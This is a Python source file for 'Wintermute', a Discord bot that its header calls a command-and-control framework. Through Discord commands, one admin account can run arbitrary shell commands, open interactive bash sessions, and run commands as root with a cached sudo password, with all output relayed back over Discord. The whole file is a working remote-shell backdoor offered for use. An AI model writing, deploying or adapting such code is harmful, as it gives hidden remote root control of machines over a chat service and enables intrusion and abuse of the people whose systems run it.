"""
WINTERMUTE C2 PROTOCOL // v1.0
---------------------------------------------------
SYSTEM: HYBRID C2 FRAMEWORK
TARGET: DISCORD GATEWAY
AUTHOR: VENATOR17
ARCH: JOB SYSTEM, VERBOSE LOGGING, CLEAN PTY
"""

import discord
from discord.ext import commands
import os
import sys
import asyncio
import subprocess
import pty
import datetime
import random
import re
import termios
import io
import signal
import collections
import fcntl

# =====================================================
# [ SYSTEM CONFIGURATION ]
# =====================================================

CONFIG = {
    "TOKEN": "XXXXXXXXX",
    "ADMIN_ID": 7777777777777777777, 
    "GUILD_ID": 7777777777777777777,
    "PREFIX": "/",
    "CATEGORY_ID": 7777777777777777777 
}

# =====================================================
# [ GLOBAL STATE ]
# =====================================================

ACTIVE_SESSIONS = {}
SESSION_BUFFERS = {}
SUDO_PASSWORD = None
RESULT_QUEUE = collections.deque()

# =====================================================
# [ VISUAL LAYER ]
# =====================================================

RED     = "\033[91m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
BLUE    = "\033[94m"
MAGENTA = "\033[95m"
CYAN    = "\033[96m"
WHITE   = "\033[97m"
RESET   = "\033[0m"
BOLD    = "\033[1m"
DIM     = "\033[2m"

def timestamp():
    return datetime.datetime.now().strftime("%H:%M:%S")

def _redact(text):
    if SUDO_PASSWORD and text:
        return text.replace(SUDO_PASSWORD, "[HIDDEN]")
    return text

def _escape_single_quotes(s):
    if s is None: return ""
    return s.replace("'", "'\"'\"'")

def log(tag, message, color=GREEN):
    safe = _redact(str(message))
    print(f"{DIM}[{timestamp()}]{RESET} {color}[{tag}]{RESET} {safe}")

def strip_ansi(text):
    text = re.sub(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])', '', text)
    text = re.sub(r'\x1B\][0-9;]*(?:\x07|\x1B\\)', '', text)
    return text

def boot_sequence():
    os.system('clear') if os.name == 'posix' else os.system('cls')
    
    text_logo = [
        r" █     █░ ██▓ ███▄    █ ▄▄▄█████▓▓█████  ██▀███   ███▄ ▄███▓ █    ██ ▄▄▄█████▓▓█████ ",
        r"▓█░ █ ░█░▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒▓██▒▀█▀ ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀ ",
        r"▒█░ █ ░█ ▒██▒▓██  ▀█ ██▒▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒▓██    ▓██░▓██  ▒██░▒ ▓██░ ▒░▒███   ",
        r"░█░ █ ░█ ░██░▓██▒  ▐▌██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  ▒██    ▒██ ▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄ ",
        r"░░██▒██▓ ░██░▒██░   ▓██░  ▒██▒ ░ ░▒████▒░██▓ ▒██▒▒██▒   ░██▒▒▒█████▓   ▒██▒ ░ ░▒████▒",
        r"░ ▓░▒ ▒  ░▓  ░ ▒░   ▒ ▒   ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░   ░  ░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░",
        r"  ▒ ░ ░   ▒ ░░ ░░   ░ ▒░    ░     ░ ░  ░  ░▒ ░ ▒░░  ░      ░░░▒░ ░ ░     ░     ░ ░  ░",
        r"    ░     ░           ░             ░  ░   ░            ░      ░                 ░  ░"
    ]

    print("")
    for line in text_logo:
        print(f"{CYAN}{BOLD}{line}{RESET}")

    # Verbose Boot Log
    print(f"\n{DIM}[*] {timestamp()} | SYSTEM_BOOT_SEQUENCE_INITIATED...{RESET}")
    print(f"{DIM}[*] {timestamp()} | LOADING_KERNEL_MODULES... {GREEN}[OK]{RESET}")
    print(f"{DIM}[*] {timestamp()} | MOUNTING_VIRTUAL_FS... {GREEN}[OK]{RESET}")
    print(f"{DIM}[*] {timestamp()} | CHECKING_NETWORK_INTERFACES... {GREEN}[OK]{RESET}")
    print(f"{DIM}[*] {timestamp()} | INITIALIZING_JOB_SCHEDULER... {GREEN}[OK]{RESET}")
    print(f"{DIM}[*] {timestamp()} | ALLOCATING_PTY_HANDLERS... {GREEN}[OK]{RESET}")
    
    print(f"\n{RED}{BOLD}>>> WINTERMUTE v1.0 // ONLINE <<<{RESET}")
    print(f"{DIM}---------------------------------------------------{RESET}")

# =====================================================
# [ BOT LOGIC ]
# =====================================================

intents = discord.Intents.default()
intents.message_content = True
intents.dm_messages = True
intents.guilds = True

bot = commands.Bot(command_prefix=CONFIG["PREFIX"], intents=intents, help_command=None)

# -----------------------------------------------------
# DELIVERY SYSTEM
# -----------------------------------------------------

async def queue_result(channel_id, content=None, file_data=None, filename="out.txt"):
    if content: content = _redact(content)
    RESULT_QUEUE.append((channel_id, content, file_data, filename))

async def delivery_daemon():
    await bot.wait_until_ready()
    log("NET", "Delivery Daemon Attached.", BLUE)
    while not bot.is_closed():
        if RESULT_QUEUE and bot.is_ready():
            cid, content, f_bytes, fname = RESULT_QUEUE.popleft()
            try:
                channel = bot.get_channel(cid)
                if channel:
                    kwargs = {}
                    if content: kwargs['content'] = content
                    if f_bytes:
                        f_obj = io.BytesIO(f_bytes)
                        kwargs['file'] = discord.File(f_obj, filename=fname)
                    
                    await channel.send(**kwargs)
                    log("NET", f"Packet Sent -> {channel.name}", BLUE)
                else:
                    log("ERR", f"Channel {cid} unreachable (Cache Miss)", RED)
            except Exception as e:
                log("WARN", f"Delivery Failed: {e} - Retrying...", YELLOW)
                RESULT_QUEUE.appendleft((cid, content, f_bytes, fname))
                await asyncio.sleep(5)
        
        await asyncio.sleep(1)

# -----------------------------------------------------
# EXECUTION ENGINE
# -----------------------------------------------------

async def run_job(channel_id, cmd_str, input_bytes=None, description="JOB"):
    clean_cmd = cmd_str.split('|')[-1].strip() if input_bytes else cmd_str
    log(description, f"Exec: {clean_cmd}", CYAN)

    try:
        process = await asyncio.create_subprocess_shell(
            cmd_str, 
            stdout=asyncio.subprocess.PIPE, 
            stderr=asyncio.subprocess.PIPE,
            stdin=asyncio.subprocess.PIPE,
            preexec_fn=os.setsid 
        )
        
        try:
            out, err = await asyncio.wait_for(process.communicate(input=input_bytes), timeout=30.0)
            
            res = strip_ansi((out + err).decode('utf-8', errors='ignore'))
            if not res: res = "[No Output]"
            res = _redact(res)
            
            log(description, "Completed Successfully.", GREEN)
            
            if len(res) < 1900:
                await queue_result(channel_id, content=f"```bash\n{res}\n```")
            else:
                await queue_result(channel_id, content="[LOG ATTACHED]", file_data=res.encode(), filename="log.txt")
                
        except asyncio.TimeoutError:
            log(description, "TIMEOUT - PURGING PROCESS GROUP", RED)
            try:
                os.killpg(os.getpgid(process.pid), signal.SIGKILL)
            except: 
                pass
            await queue_result(channel_id, content="⏱️ **TIMEOUT (30s) - THREAD KILLED**")
            
    except Exception as e:
        log("ERR", f"Job Execution Failed: {e}", RED)
        await queue_result(channel_id, content=f"System Error: {e}")

# -----------------------------------------------------
# PTY CORE (INTERACTIVE)
# -----------------------------------------------------

def read_from_pty(fd, channel_id):
    try:
        data = os.read(fd, 1024)
        if not data: return
        if channel_id in SESSION_BUFFERS:
            SESSION_BUFFERS[channel_id].extend(data)
    except OSError: pass 

async def buffer_flusher():
    await bot.wait_until_ready()
    while not bot.is_closed():
        if SESSION_BUFFERS:
            for cid in list(SESSION_BUFFERS.keys()):
                buf = SESSION_BUFFERS[cid]
                if buf:
                    raw = buf.decode('utf-8', errors='ignore')
                    clean = _redact(strip_ansi(raw))
                    SESSION_BUFFERS[cid] = bytearray()
                    
                    if len(clean) > 1900:
                        for i in range(0, len(clean), 1900):
                            await queue_result(cid, content=f"```bash\n{clean[i:i+1900]}\n```")
                    else:
                        await queue_result(cid, content=f"```bash\n{clean}\n```")
        await asyncio.sleep(1.0)

def close_session_internal(channel_id):
    if channel_id in ACTIVE_SESSIONS:
        s = ACTIVE_SESSIONS[channel_id]
        try:
            asyncio.get_running_loop().remove_reader(s["fd"])
            os.close(s["fd"])
            s["proc"].terminate()
            log("TERM", f"PID {s['proc'].pid} terminated.", YELLOW)
        except: pass
        del ACTIVE_SESSIONS[channel_id]
    if channel_id in SESSION_BUFFERS:
        del SESSION_BUFFERS[channel_id]

# -----------------------------------------------------
# EVENTS
# -----------------------------------------------------

@bot.event
async def on_ready():
    boot_sequence()
    log("STATUS", f"Bot Identity: {bot.user}", MAGENTA)
    
    if CONFIG["GUILD_ID"]:
        try:
            guild = discord.Object(id=CONFIG["GUILD_ID"])
            bot.tree.copy_global_to(guild=guild)
            synced = await bot.tree.sync(guild=guild)
            log("SYNC", f"Registered {len(synced)} Command(s)", BLUE)
            bot.tree.clear_commands(guild=None)
            await bot.tree.sync(guild=None)
        except Exception as e: log("ERR", f"Tree Sync Failed: {e}", RED)
    
    bot.loop.create_task(buffer_flusher())
    bot.loop.create_task(delivery_daemon())
    
    await bot.change_presence(status=discord.Status.online, activity=discord.Activity(type=discord.ActivityType.listening, name="root instructions"))

def check_access(ctx): return ctx.author.id == CONFIG["ADMIN_ID"]

async def confirm_action(ctx, action):
    msg_txt = f"```css\n[ CONFIRM: {action} (Y/N)? ]\n```"
    if ctx.interaction: await ctx.send(msg_txt, ephemeral=True)
    else: await ctx.send(msg_txt)
    
    def check(m): return m.author == ctx.author and m.channel == ctx.channel and m.content.lower() in ['y', 'yes']
    try:
        msg = await bot.wait_for('message', check=check, timeout=15.0)
        try: await msg.delete() 
        except: pass
        return True
    except:
        return False

@bot.event
async def on_message(message):
    if message.author == bot.user: return
    if message.content.startswith(CONFIG["PREFIX"]) or message.content.startswith("!"):
        await bot.process_commands(message)
        return

    if message.channel.id in ACTIVE_SESSIONS:
        session = ACTIVE_SESSIONS[message.channel.id]
        try:
            os.write(session["fd"], (message.content + "\n").encode())
            log("INPUT", f"STDIN -> PID {session['proc'].pid}", CYAN)
        except OSError:
            close_session_internal(message.channel.id)

# -----------------------------------------------------
# COMMANDS
# -----------------------------------------------------

@bot.command(name="sync")
async def sync_menu(ctx):
    if not check_access(ctx): return
    await ctx.send("```ini\n[ SYNCING... ]\n```")
    try:
        guild = discord.Object(id=CONFIG["GUILD_ID"])
        bot.tree.copy_global_to(guild=guild)
        await bot.tree.sync(guild=guild)
        await ctx.send("```ini\n[ DONE ]\n```")
    except Exception as e: await ctx.send(f"Error: {e}")

@bot.hybrid_command(name="ping", description="Ping Check")
async def ping(ctx):
    if not check_access(ctx): return
    await queue_result(ctx.channel.id, content=f"```ini\n[ ONLINE: {round(bot.latency*1000)}ms ]\n```")

@bot.hybrid_command(name="sys", description="System Info")
async def sys_info(ctx):
    if not check_access(ctx): return
    try:
        u = os.popen("whoami").read().strip()
        k = os.popen("uname -sr").read().strip()
        await queue_result(ctx.channel.id, content=f"```ini\n[ USER: {u} ]\n[ KERNEL: {k} ]\n```")
    except: await queue_result(ctx.channel.id, content="Error")

@bot.hybrid_command(name="shell", description="Spawn Interactive PTY Shell")
async def spawn_shell(ctx, tool: str = "/bin/bash"):
    if not check_access(ctx): return
    if not ctx.guild: return await ctx.send("Servers only.")
    
    log("CMD", f"Spawning SHELL: {tool}", YELLOW)
    cname = f"pty-{random.randint(1000,9999)}-{tool.split('/')[-1]}"
    try:
        cat = ctx.guild.get_channel(CONFIG["CATEGORY_ID"]) if CONFIG["CATEGORY_ID"] else None
        new_ch = await ctx.guild.create_text_channel(cname, category=cat)
        
        m_fd, s_fd = pty.openpty()
        
        # [IMPROVED TTY SETTINGS]
        try:
            attr = termios.tcgetattr(s_fd)
            attr[3] = attr[3] & ~termios.ECHO
            termios.tcsetattr(s_fd, termios.TCSANOW, attr)
        except: pass

        env = os.environ.copy()
        env["TERM"] = "xterm-256color" 
        
        # [PROCESS SPAWN WITH SETSID]
        def set_ctty():
            os.setsid()
            try:
                fcntl.ioctl(sys.stdin, termios.TIOCSCTTY, 0)
            except: pass

        proc = subprocess.Popen(
            "/bin/bash", 
            shell=True, 
            stdin=s_fd, stdout=s_fd, stderr=s_fd, 
            preexec_fn=set_ctty, 
            close_fds=True, 
            env=env
        )
        
        ACTIVE_SESSIONS[new_ch.id] = {"fd": m_fd, "proc": proc}
        SESSION_BUFFERS[new_ch.id] = bytearray()
        asyncio.get_running_loop().add_reader(m_fd, read_from_pty, m_fd, new_ch.id)
        
        if tool != "/bin/bash" and tool != "bash":
             os.write(m_fd, (tool + "\n").encode())

        log("SHELL", f"Session Established | PID: {proc.pid}", GREEN)
        await ctx.send(f"✅ **Session:** {new_ch.mention}") 
        await new_ch.send(f"```ini\n[ SHELL ACTIVE ]\n[ TOOL: {tool} ]\n[ PID: {proc.pid} ]\n```")
    except Exception as e: 
        log("ERR", f"Spawn failed: {e}", RED)
        await ctx.send(f"Error: {e}")

@bot.hybrid_command(name="list", description="List Active Sessions")
async def list_sessions(ctx):
    if not check_access(ctx): return
    if not ACTIVE_SESSIONS: return await ctx.send("```ini\n[ NO ACTIVE SESSIONS ]\n```")
    report = "\n".join([f"[ CHANNEL: {k} ] [ PID: {v['proc'].pid} ]" for k, v in ACTIVE_SESSIONS.items()])
    await ctx.send(f"```ini\n{report}\n```")

@bot.hybrid_command(name="close", description="Close Session")
async def close_session(ctx):
    if not check_access(ctx): return
    if not await confirm_action(ctx, "CLOSE SESSION"): return
    
    cid = ctx.channel.id
    if cid in ACTIVE_SESSIONS: close_session_internal(cid)
    try: await ctx.channel.delete()
    except: pass

@bot.hybrid_command(name="clear", description="Wipe Chat")
async def clear_chat(ctx, limit: int = None):
    if not check_access(ctx): return
    if isinstance(ctx.channel, discord.DMChannel): return await ctx.send("No DMs.")
    if not await confirm_action(ctx, "WIPE CHAT"): return
    try:
        await ctx.channel.purge(limit=limit)
        await ctx.send("```ini\n[ MEMORY FORMATTED ]\n```", delete_after=5)
    except: await ctx.send("Purge Failed.")

@bot.hybrid_command(name="shutdown", description="Terminate Bot")
async def shutdown(ctx):
    if not check_access(ctx): return
    if not await confirm_action(ctx, "SHUTDOWN"): return
    log("CMD", "GLOBAL SHUTDOWN INITIATED", RED)
    await ctx.send("```css\n[ OFFLINE ]\n```")
    for cid in list(ACTIVE_SESSIONS.keys()): close_session_internal(cid)
    await bot.close()
    sys.exit()

@bot.hybrid_command(name="auth", description="Set Sudo Pass")
async def auth(ctx, password: str):
    if not check_access(ctx): return
    global SUDO_PASSWORD
    SUDO_PASSWORD = password
    log("AUTH", "Sudo password cached securely", MAGENTA)
    if ctx.interaction:
        await ctx.send("```ini\n[ AUTH CACHED ]\n```", ephemeral=True)
    else:
        await ctx.message.delete()

@bot.hybrid_command(name="x", description="Quick Exec (Async Job)")
async def quick_exec(ctx, cmd: str):
    if not check_access(ctx): return
    try:
        if ctx.interaction:
            await ctx.send("```ini\n[ JOB QUEUED ]\n```", ephemeral=True)
        else:
            await ctx.message.add_reaction("⏳")
    except: pass 
    bot.loop.create_task(run_job(ctx.channel.id, cmd, description="EXEC"))

@bot.hybrid_command(name="sudo", description="Exec with Root (Async)")
async def sudo_exec(ctx, cmd: str):
    if not check_access(ctx): return
    if not SUDO_PASSWORD:
        if ctx.interaction:
            await ctx.send("```ini\n[ AUTH REQUIRED ]\n```", ephemeral=True)
        else:
            await ctx.message.delete()
        return

    try:
        if ctx.interaction:
            await ctx.send("```ini\n[ SUDO JOB QUEUED ]\n```", ephemeral=True)
        else:
            await ctx.message.add_reaction("⚡")
    except: pass

    esc_pass = _escape_single_quotes(SUDO_PASSWORD)
    full_cmd = f"printf '%s\\n' '{esc_pass}' | sudo -S -p '' timeout 40s stdbuf -oL {cmd}"

    log("SUDO", f"Escalated Exec Initiated", RED)
    bot.loop.create_task(run_job(ctx.channel.id, full_cmd, description="SUDO"))

if __name__ == "__main__":
    if CONFIG["TOKEN"].startswith("ВСТАВ"):
        print(f"{RED}[CRITICAL] CONFIG ERROR.{RESET}")
        sys.exit()
    try: bot.run(CONFIG["TOKEN"])
    except Exception as e: print(f"{RED}[FATAL] {e}{RESET}")
